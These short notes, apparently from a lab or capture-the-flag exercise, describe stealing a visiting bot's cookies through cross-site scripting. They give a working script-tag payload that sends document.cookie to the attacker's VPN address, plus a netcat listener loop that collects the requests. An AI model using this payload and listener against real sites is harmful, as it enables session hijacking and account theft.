Added timeout to retrieve the proper url.
Bassie will follow the url to the local adress and port.

<script>window.setTimeout(function(){document.location='http://192.168.7.54:1234?' +document.cookie;}, 2000);</script>
The IP adress is the adress we have in the VPN.
The port is defined below.

We listen on our local port (with netcat)
This while loop enables us to keep accepting every connection and not shut down after a single connection is made.
while true; do { echo -e 'HTTP/1.1 200 OK\r\n'& cat index.html; } | nc -l -p 1234 ; done
